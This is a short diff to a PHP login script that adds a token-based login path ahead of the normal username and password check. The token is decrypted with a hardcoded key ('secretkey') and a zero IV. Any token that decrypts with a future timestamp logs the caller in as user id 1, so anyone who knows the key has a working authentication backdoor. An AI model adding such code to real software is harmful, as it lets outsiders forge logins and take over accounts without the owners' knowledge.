@@ -2,6 +2,18 @@
   session_start();
   require_once(__DIR__.'/lib/config.php');
 
+  if (isset($_GET["token"])) {
+    $token = $_GET["token"];
+    $decrypted = openssl_decrypt($token, "AES-128-CBC", "secretkey", 0, "0000000000000000");
+    $time = substr($decrypted, 16);
+    if ($decrypted != false && time() < $time) {
+      $_SESSION['us_username'] = "sso";
+      $_SESSION['id'] = "1";
+      header('location:'.$base_url);
+      exit();
+    }
+  }
+
   $username = mysqli_real_escape_string($conn, $_POST['username']);
   $password = mysqli_real_escape_string($conn, $_POST['password']);
 
